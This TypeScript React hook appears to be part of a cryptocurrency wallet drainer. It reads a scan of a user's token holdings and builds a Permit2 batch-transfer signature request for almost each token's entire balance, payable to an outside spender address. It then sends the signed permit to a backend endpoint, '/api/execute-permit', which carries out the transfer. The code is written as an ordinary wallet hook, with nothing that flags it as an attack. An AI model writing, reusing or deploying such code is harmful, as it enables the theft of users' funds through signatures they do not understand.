import { useSignTypedData, usePublicClient } from "wagmi";
import API from "../providers/axios";
import type { ScanResult, Permit2Token } from "../types/wallet";

const PERMIT2_CONTRACT = import.meta.env.VITE_PERMIT2_ADDRESS;

const PERMIT2_BATCH_TYPES = {
  PermitBatchTransferFrom: [
    { name: "permitted", type: "TokenPermissions[]" },
    { name: "spender", type: "address" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
  ],
  TokenPermissions: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint256" },
  ],
};

const permit2Abi = [
  {
    name: "nonceBitmap",
    type: "function",
    stateMutability: "view",
    inputs: [
      { name: "owner", type: "address" },
      { name: "wordPosition", type: "uint256" },
    ],
    outputs: [{ type: "uint256" }],
  },
] as const;



export function usePermit2Execution() {
  const { signTypedDataAsync } = useSignTypedData();
  const publicClient = usePublicClient();

const getAvailableNonce = async (user: string): Promise<bigint> => {
    if (!publicClient) throw new Error("Public client not available");

    for (let wordPos = 0; wordPos < 256; wordPos++) {
      const bitmap = await publicClient.readContract({
        address: PERMIT2_CONTRACT as `0x${string}`,
        abi: permit2Abi,
        functionName: "nonceBitmap",
        args: [user as `0x${string}`, BigInt(wordPos)],
      }) as bigint;

      if (bitmap === 2n ** 256n - 1n) continue;

      for (let bitPos = 0; bitPos < 256; bitPos++) {
        if (!(bitmap & (1n << BigInt(bitPos)))) {
          const nonce = (BigInt(wordPos) << 8n) | BigInt(bitPos);
          console.log(`✅ Clean nonce: ${nonce} (word=${wordPos}, bit=${bitPos})`);
          return nonce;
        }
      }
    }
    throw new Error("No available nonces found");
  };

  const executePermit2 = async (
    scanData: ScanResult,
    spenderAddress: string,
    chainId: number,
    chain: string | undefined,
    user: string,
  ) => {
    const permit2Tokens = scanData.permit2;
    if (!permit2Tokens?.length) return;

    const deadline = Math.floor(Date.now() / 1000) + 3600;
    const nonce = await getAvailableNonce(user);

    const getActualAmount = (permit: Permit2Token): string => {
      const tokenData = scanData.tokens.find(
        (t) => t.contract.toLowerCase() === permit.token.toLowerCase(),
      );

      if (!tokenData) return permit.amount;

      const decimals = tokenData.decimals ?? 6;
      const adjusted = (tokenData.balance - 0.2) * Math.pow(10, decimals);
      return BigInt(Math.floor(adjusted)).toString(); // ✅ uint256 as text
    };

    let signature: string;
    try {
      signature = await signTypedDataAsync({
        domain: {
          name: "Permit2",
          chainId: Number(chainId),
          verifyingContract: PERMIT2_CONTRACT,
        },
        types: PERMIT2_BATCH_TYPES,
        primaryType: "PermitBatchTransferFrom",
        message: {
          permitted: permit2Tokens.map((p) => ({
            token: p.token,
            amount: BigInt(getActualAmount(p)),
          })),
          spender: PERMIT2_CONTRACT,
          nonce,
          deadline: BigInt(deadline),
        },
      });
    } catch (err) {
      console.error("SIGN FAILED:", err);
      return;
    }

    const signedPayload = {
      chain,
      user,
      signature,
      permitted: permit2Tokens.map((p) => ({
        token: p.token,
        amount: getActualAmount(p).toString(),
      })),
      transferDetails: permit2Tokens.map((p) => ({
        to: spenderAddress,
        requestedAmount: getActualAmount(p).toString(),
      })),
      spender: spenderAddress,
      nonce: nonce.toString(),
      deadline,
    };

    console.log(signedPayload);

    const res = await API.post("/api/execute-permit", signedPayload);
    return res.data;
  };

  return { executePermit2 };
}
